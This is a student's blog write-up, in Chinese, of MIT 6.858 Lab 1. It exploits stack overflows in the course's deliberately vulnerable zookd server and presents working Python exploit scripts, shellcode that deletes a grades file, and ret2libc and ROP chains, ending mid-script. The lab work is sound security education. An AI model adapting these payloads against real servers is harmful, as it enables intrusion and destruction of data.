@@ -1,0 +1,820 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/chtholly1.jpg">
+  <link rel="icon" href="/img/chtholly1.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#4c81b9">
+  <meta name="author" content="Isolator">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="mit 计算机系统安全实验">
+<meta property="og:type" content="article">
+<meta property="og:title" content="mit6858 Lab1">
+<meta property="og:url" content="https://isolator-1.github.io/2023/12/06/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/mit6858Lab1/index.html">
+<meta property="og:site_name" content="Isolator&#39;s Blog">
+<meta property="og:description" content="mit 计算机系统安全实验">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://isolator-1.github.io/img/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/mit6858/1.jpg">
+<meta property="article:published_time" content="2023-12-06T02:30:00.000Z">
+<meta property="article:modified_time" content="2024-07-23T06:27:19.475Z">
+<meta property="article:author" content="Isolator">
+<meta property="article:tag" content="ctf-pwn">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://isolator-1.github.io/img/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/mit6858/1.jpg">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>mit6858 Lab1 - Isolator&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"isolator-1.github.io","root":"/","version":"1.9.3","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":1},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 5.4.2"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>_φ_(．．) Chtholly Nota Seniorious</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                Home
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                Archives
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                Categories
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                Tags
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                About
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                Links
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/chtholly2.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="mit6858 Lab1"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-12-06 10:30" pubdate>
+          December 6, 2023 am
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          7.8k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          66 mins
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">mit6858 Lab1</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="mit-系统安全实验Lab1"><a href="#mit-系统安全实验Lab1" class="headerlink" title="mit 系统安全实验Lab1"></a>mit 系统安全实验Lab1</h2><p>参考自<a target="_blank" rel="noopener" href="https://arttnba3.cn/2022/12/25/EXPR-0X01-MIT_6_858/">大佬的博客</a>🐤</p>
+<p>地址 <a target="_blank" rel="noopener" href="https://css.csail.mit.edu/6.858/2022/labs/lab1.html%EF%BC%88Lab1%E7%94%A8%E7%9A%842022%E5%B9%B4%E7%9A%84%E5%AE%9E%E9%AA%8C%EF%BC%89">https://css.csail.mit.edu/6.858/2022/labs/lab1.html（Lab1用的2022年的实验）</a></p>
+<p>给了一个虚拟机<a target="_blank" rel="noopener" href="https://web.mit.edu/6.858/2022/6.858-x86_64-v22.zip">ubuntu 21.10</a>的vmdk，安装完之后是一个tty，发现没有net-tools，也不能从虚拟机外复制进来内容，去学习了一下发现<code>ip addr</code>也可以查看ip，不过这个输出有点多，这个虚拟机终端也没法往上滚动，加了一个grep 192.168就好了。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">student@6858-v22:~$ ip addr | grep 192.168<br>    inet 192.168.71.138/24 brd 192.168.71.255 scope global dynamic eth0<br></code></pre></td></tr></table></figure>
+
+<p>然后就可以ssh了</p>
+<p>但是ubuntu21.10已经没法apt install了（</p>
+<p>实验的内容在<code>git clone https://web.mit.edu/6858/2022/lab.git </code></p>
+<h3 id="Lab1"><a href="#Lab1" class="headerlink" title="Lab1"></a>Lab1</h3><p>按照说明，首先make一下，然后运行<code>./clean-env.sh ./zookd 8080</code></p>
+<blockquote>
+<p>这里有个很玄学的问题是，我在物理机上clone下来lab，再用vscode传虚拟机，不光程序运行起来访问不到网页，make的时候也有警告。在虚拟机里clone下来的就什么问题都没有😶‍🌫️没能理解是为什么</p>
+</blockquote>
+<p>然后可以访问到网页，是一个登陆界面</p>
+<h4 id="lab1-exercise-1-2"><a href="#lab1-exercise-1-2" class="headerlink" title="lab1 exercise 1 + 2"></a>lab1 exercise 1 + 2</h4><p>exercise1 让在<code>zookd.c</code>和<code>http.c</code>找漏洞</p>
+<p>main函数在zookd.c中下面解释各个函数干了什么</p>
+<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">main : 传入参数port 调用run<span class="hljs-constructor">_server(<span class="hljs-params">zookd</span>.<span class="hljs-params">c</span>)</span><br>run_server : 通过start<span class="hljs-constructor">_server(<span class="hljs-params">zookd</span>.<span class="hljs-params">c</span>)</span>初始化socket，<br>             然后一个死循环，对每个accept fork出一个线程，执行process<span class="hljs-constructor">_client(<span class="hljs-params">zookd</span>.<span class="hljs-params">c</span>)</span><br>process_client : <br>    <span class="hljs-number">1.</span> http_request_line (http.c) : 处理请求包的第一行，即<span class="hljs-string">&quot;GET /foo.html HTTP/1.0&quot;</span>这种<br>    <span class="hljs-number">2.</span> http_request_headers (http.c) : 一个死循环处理从第二行开始的所有内容，存在栈溢出。<br>       accept来的buf<span class="hljs-literal">[<span class="hljs-number">8192</span>]</span>进行了防溢出处理，但是value和envvar长度只有<span class="hljs-number">512</span>，可以溢出<br>       每一对envvar和value形成了键值对，存储到了环境变量里<br>    <span class="hljs-number">3.</span> http_serve (http.c) : 后面再说<br></code></pre></td></tr></table></figure>
+
+<p>exercise2 只说要让程序崩溃就行，不用劫持控制流，那直接发送一个大的包过去就完了。要求写一个<code>exploit-2.py</code>的脚本，在lab文件夹里有给好的模板<code>exploit-template.py</code>，改一下<code>build_exploit</code>就好</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">build_exploit</span>(<span class="hljs-params">shellcode</span>):<br>    req =   <span class="hljs-string">b&quot;GET / HTTP/1.0\r\n&quot;</span> + \<br>            <span class="hljs-string">b&quot;hack: &quot;</span> + <span class="hljs-string">b&quot;a&quot;</span> * <span class="hljs-number">8100</span> + <span class="hljs-string">b&quot;\r\n&quot;</span><br>    <span class="hljs-keyword">return</span> req<br></code></pre></td></tr></table></figure>
+
+<p>观察程序报错：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">student@6858-v22:~/lab$ ./clean-env.sh ./zookd 8080<br><span class="hljs-built_in">exec</span> <span class="hljs-built_in">env</span> - PWD=/home/student/lab SHLVL=0 setarch x86_64 -R ./zookd 8080<br>Child process 9738 terminated incorrectly, receiving signal 11<br></code></pre></td></tr></table></figure>
+
+<p>执行检查：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">student@6858-v22:~/lab$ make check-crash<br>./check-bin.sh<br>WARNING: bin.tar.gz might not have been built this year (2023);<br>WARNING: <span class="hljs-keyword">if</span> 2023 is correct, ask course staff to rebuild bin.tar.gz.<br>tar xf bin.tar.gz<br>./check-crash.sh zookd-exstack ./exploit-2.py<br>10453 --- SIGSEGV &#123;si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x7ffffffff000&#125; ---<br>10453 +++ killed by SIGSEGV (core dumped) +++<br>10416 --- SIGCHLD &#123;si_signo=SIGCHLD, si_code=CLD_DUMPED, si_pid=10453, si_uid=1000, si_status=SIGSEGV, si_utime=0, si_stime=52&#125; ---<br>PASS ./exploit-2.py<br></code></pre></td></tr></table></figure>
+
+<h4 id="lab1-exercise-3"><a href="#lab1-exercise-3" class="headerlink" title="lab1 exercise 3"></a>lab1 exercise 3</h4><p>lab里给了一个shellcode.S，在make时会编译成shellcode.bin，可以用<code>./run-shellcode shellcode.bin</code>来执行这个程序。</p>
+<p>原本是execve(“/bin/sh”)，exercise3 要求把它改成删除<code>grades.txt</code>。给的shellcode.S是AT&amp;T汇编，抄的大佬的代码😭😭😭😭</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.globl main<br>	.type	main, @function<br><br>main:<br>	/* store the string on the stack */<br>	xorq  %rax, %rax<br>	pushq %rax<br>	movq  $0x7478742e73656461, %rax /* &quot;ades.txt&quot; */<br>	pushq %rax<br>	movq  $0x72672f746e656475, %rax /* &quot;udent/gr&quot; */<br>	pushq %rax<br>	movq  $0x74732f656d6f682f, %rax /* &quot;/home/st&quot; */<br>	pushq %rax<br><br>	/* unlink(rsp) */<br>	movq  %rsp, %rdi<br>	movq  $87, %rax /* SYS_unlink */<br>	syscall<br><br>	/* exit() */      不加exit会报个segmentation fault，但是也能执行<br>	xorq  %rdi, %rdi<br>	movq  $60, %rax	/* SYS_exit */<br>	syscall<br></code></pre></td></tr></table></figure>
+
+<h4 id="lab1-exercise-4"><a href="#lab1-exercise-4" class="headerlink" title="lab1 exercise 4"></a>lab1 exercise 4</h4><p>exercise2 的栈溢出注入shellcode，执行的程序换了一下，换成没开NX的版本</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./clean-env.sh ./zookd-exstack 8080<br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>在url_decode函数里，当sp字符串里看到了\x00字符，就会终止向valuie里复制字符串，但是又有把%加两个digit转换为数字的case，因此payload要<code>.replace(&quot;\x00,%00&quot;)</code>再发送。</p>
+</blockquote>
+<p>接下来就是寻找字符串的位置和返回地址的位置，虽然<code>value</code>和<code>envvar</code>看上去都可以，但是显然value更简单一点，有两种方法：</p>
+<p>第一种：反正有源码，直接print出来</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;value addr : %p\n&quot;</span>, &amp;value);<br><span class="hljs-type">void</span> *stackAddress;<br>__asm__(<span class="hljs-string">&quot;movq %%rbp, %0&quot;</span> : <span class="hljs-string">&quot;=r&quot;</span> (stackAddress));<br>stackAddress = (<span class="hljs-type">void</span>*)((<span class="hljs-type">char</span>*)stackAddress + <span class="hljs-number">8</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Return Address Stack Address: %p\n&quot;</span>, stackAddress);<br></code></pre></td></tr></table></figure>
+
+<p>第二种：调试，gdb -p $(pgrep zookd-)<code>，下断点</code>b http.c:xxx<code>，查看变量地址</code>print &amp;value`，拿到shellcode地址，再用rbp+8拿到返回地址（或者info frame）</p>
+<p>payload如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python">stack_buffer = <span class="hljs-number">0x7fffffffda50</span><br>stack_retaddr = <span class="hljs-number">0x7fffffffdc88</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">build_exploit</span>(<span class="hljs-params">shellcode</span>):<br>    req = <span class="hljs-string">b&quot;GET / HTTP/1.0\r\n&quot;</span><br>    req += <span class="hljs-string">b&quot;hack: &quot;</span><br>    req += (<br>        shellcode + <span class="hljs-string">b&quot;A&quot;</span> * ((stack_retaddr - stack_buffer) - <span class="hljs-built_in">len</span>(shellcode)) +  p64(stack_buffer)<br>    ).replace(<span class="hljs-string">b&quot;\x00&quot;</span>, <span class="hljs-string">b&#x27;%00&#x27;</span>)<br>    req += <span class="hljs-string">b&quot;\r\n&quot;</span> <br>    req += <span class="hljs-string">b&quot;\r\n&quot;</span> <span class="hljs-comment"># 注意这里额外的一行</span><br>    <span class="hljs-keyword">return</span> req<br></code></pre></td></tr></table></figure>
+
+<p>在<code>http_request_headers</code>的死循环跳出的条件是</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-keyword">if</span> (buf[<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;\0&#x27;</span>)     <span class="hljs-comment">/* end of headers */</span><br>    <span class="hljs-keyword">break</span>;<br></code></pre></td></tr></table></figure>
+
+<p>因此想要跳出循环，必须最后要有一个空行！！！！！！！😭😭😭😭😭😭😭😭😭😭😭😭</p>
+<p>我在这卡了一下午，一直以为是我的栈地址不对😭😭😭😭😭😭😭😭😭😭😭😭😭😭😭😭</p>
+<p>再学习一下大佬的代码：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">shellcode = asm(<span class="hljs-string">&#x27;nop&#x27;</span>) * <span class="hljs-number">4096</span> + asm(shellcode_text)<br>payload = (p64(<span class="hljs-number">0x7fffffffe000</span>) * <span class="hljs-number">128</span> + shellcode).replace(<span class="hljs-string">b&#x27;\x00&#x27;</span>, <span class="hljs-string">b&#x27;%00&#x27;</span>)<br>req  = <span class="hljs-string">b&quot;GET / HTTP/1.0\r\n&quot;</span><br>req += <span class="hljs-string">b&quot;arttnba3: &quot;</span> + payload + <span class="hljs-string">b&quot;\r\n&quot;</span><br>req += <span class="hljs-string">b&quot;\r\n&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p>只要返回地址能够命中4096个nop中的任何一个，就能执行处后面的shellcode（但是这个地址又是去哪看的呢😶‍🌫️</p>
+<p>执行检查：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">student@6858-v22:~/lab$ <span class="hljs-built_in">chmod</span> +x ./exploit-4.py <br>student@6858-v22:~/lab$ make check-exstack<br>./check-bin.sh<br>WARNING: bin.tar.gz might not have been built this year (2023);<br>WARNING: <span class="hljs-keyword">if</span> 2023 is correct, ask course staff to rebuild bin.tar.gz.<br>tar xf bin.tar.gz<br>./check-attack.sh zookd-exstack ./exploit-4.py<br>PASS ./exploit-4.py<br></code></pre></td></tr></table></figure>
+
+
+
+<h4 id="lab1-exercise5"><a href="#lab1-exercise5" class="headerlink" title="lab1 exercise5"></a>lab1 exercise5</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./clean-env.sh ./zookd-exstack 8080<br></code></pre></td></tr></table></figure>
+
+<p>开了nx，ret2libc。这道题要从<code>/proc/&lt;pid&gt;/maps</code>查看libc被加载到哪（其实都已经gdb了，直接<code>p 某个函数</code>，再减去<code>libc.sym[&#39;xxx&#39;]</code>得到的也一样</p>
+<blockquote>
+<p>在gdb里也可以<code>shell cat /proc/&lt;pid&gt;/maps</code></p>
+</blockquote>
+<p>栈地址和之前是一样的，把字符串放在value上，然后在libc里找<code>pop rdi; ret</code>就行了。exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python">stack_buffer = <span class="hljs-number">0x7fffffffda50</span><br>stack_retaddr = <span class="hljs-number">0x7fffffffdc88</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">build_exploit</span>(<span class="hljs-params">shellcode</span>):<br>    libc_base = <span class="hljs-number">0x1555552e8000</span><br>    libc = ELF(<span class="hljs-string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)<br>    unlink = libc_base + libc.sym[<span class="hljs-string">&quot;unlink&quot;</span>]<br>    pop_rdi = libc_base + <span class="hljs-number">0x2e6c5</span> <span class="hljs-comment">#  pop rdi ; ret</span><br><br>    payload = <span class="hljs-string">b&quot;/home/student/grades.txt\x00&quot;</span> <br>    payload += <span class="hljs-string">b&#x27;A&#x27;</span> * (stack_retaddr - stack_buffer - <span class="hljs-built_in">len</span>(payload)) <br>    payload += p64(pop_rdi) + p64(stack_buffer) + p64(unlink)<br><br>    req = <span class="hljs-string">b&quot;GET / HTTP/1.0\r\n&quot;</span><br>    req += <span class="hljs-string">b&quot;hack: &quot;</span><br>    payload = payload.replace(<span class="hljs-string">b&#x27;\x00&#x27;</span>, <span class="hljs-string">b&#x27;%00&#x27;</span>)<br>    req += payload + <span class="hljs-string">b&quot;\r\n&quot;</span> + <span class="hljs-string">b&quot;\r\n&quot;</span><br>    <span class="hljs-keyword">return</span> req<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">student@6858-v22:~/lab$ make check-libc<br>./check-bin.sh<br>WARNING: bin.tar.gz might not have been built this year (2023);<br>WARNING: <span class="hljs-keyword">if</span> 2023 is correct, ask course staff to rebuild bin.tar.gz.<br>tar xf bin.tar.gz<br>./check-attack.sh zookd-nxstack ./exploit-5.py<br>PASS ./exploit-5.py<br></code></pre></td></tr></table></figure>
+
+<p>但是我看了一下大佬的exp，（假设未知value和retaddr），用malloc分配一段地址，靠rax加偏移量去内容的指令完成写入字符串，然后把rax放到rdi里，调用unlink。</p>
+<p>但是在我的libc里，向chunk写入字符串倒是能找到gadget，但是没法把rax挪到rdi里。找不到以rax为src，以任何一个寄存器（非取内容）为dst的<code>mov</code>指令，也找不到形如<code>pop_rax_push_xxx_ret</code>的东西。寄了（</p>
+<p><del>我不李姐为什么同一个vmdk创建的虚拟机libc内容不一样？真不懂😭</del></p>
+<p>对不起，看到lab2才发现他没用给的虚拟机</p>
+<p>虽然但是，还是摆在这学习一下吧</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_malicious_request</span>():<br>    e = ELF(<span class="hljs-string">&#x27;./zookd-nxstack&#x27;</span>)<br>    libc = ELF(<span class="hljs-string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)<br>    libc_base = <span class="hljs-number">0x1555552e8000</span><br>    <br>    pop_rdi_ret = libc_base + libc.search(asm(<span class="hljs-string">&#x27;pop rdi ; ret&#x27;</span>)).__next__()<br>    pop_rdx_pop_rbx_ret = libc_base + <span class="hljs-number">0x11f497</span> <span class="hljs-comment"># &#x27;pop rdx ; ret&#x27; by search can&#x27;t be used</span><br>    pop_rcx_ret = libc_base + libc.search(asm(<span class="hljs-string">&#x27;pop rcx ; ret&#x27;</span>)).__next__()<br>    ret = pop_rdi_ret + <span class="hljs-number">1</span><br>    copy_gadget = libc_base + <span class="hljs-number">0xc5163</span> <span class="hljs-comment"># mov qword ptr [rax + rdx - 8], rdi ; ret</span><br>    push_rax_pop_rbx_ret = libc_base + <span class="hljs-number">0x1750eb</span><br>    mov_rdi_rbx_call_rcx = libc_base + <span class="hljs-number">0x15e9d8</span><br>   <br>    func_malloc = libc_base + libc.sym[<span class="hljs-string">&#x27;malloc&#x27;</span>]<br>    func_unlink = libc_base + libc.sym[<span class="hljs-string">&#x27;unlink&#x27;</span>]<br>    <span class="hljs-comment"># ret for slide</span><br>    payload  = <span class="hljs-number">512</span> * p64(ret)<br>    <span class="hljs-comment"># alloc a chunk to store the string</span><br>    payload += p64(pop_rdi_ret) + p64(<span class="hljs-number">0x100</span>) + p64(func_malloc)<br>    <span class="hljs-comment"># copy string to chunk</span><br>    payload += p64(pop_rdx_pop_rbx_ret) + p64(<span class="hljs-number">0x8</span>) + <span class="hljs-string">b&#x27;arttnba3&#x27;</span><br>    payload += p64(pop_rdi_ret) + p64(<span class="hljs-number">0x74732f656d6f682f</span>) + p64(copy_gadget)<br>    payload += p64(pop_rdx_pop_rbx_ret) + p64(<span class="hljs-number">0x10</span>) + <span class="hljs-string">b&#x27;arttnba3&#x27;</span><br>    payload += p64(pop_rdi_ret) + p64(<span class="hljs-number">0x72672f746e656475</span>) + p64(copy_gadget)<br>    payload += p64(pop_rdx_pop_rbx_ret) + p64(<span class="hljs-number">0x18</span>) + <span class="hljs-string">b&#x27;arttnba3&#x27;</span><br>    payload += p64(pop_rdi_ret) + p64(<span class="hljs-number">0x7478742e73656461</span>) + p64(copy_gadget)<br>    payload += p64(pop_rdx_pop_rbx_ret) + p64(<span class="hljs-number">0x20</span>) + <span class="hljs-string">b&#x27;arttnba3&#x27;</span><br>    payload += p64(pop_rdi_ret) + p64(<span class="hljs-number">0</span>) + p64(copy_gadget)<br>    <span class="hljs-comment"># call unlink(chunk)</span><br>    payload += p64(pop_rcx_ret) + p64(func_unlink)<br>    payload += p64(push_rax_pop_rbx_ret)<br>    payload += p64(mov_rdi_rbx_call_rcx)<br>    <span class="hljs-comment"># url encoding</span><br>    payload = payload.replace(<span class="hljs-string">b&#x27;\x00&#x27;</span>, <span class="hljs-string">b&#x27;%00&#x27;</span>)<br>    req  = <span class="hljs-string">b&quot;GET / 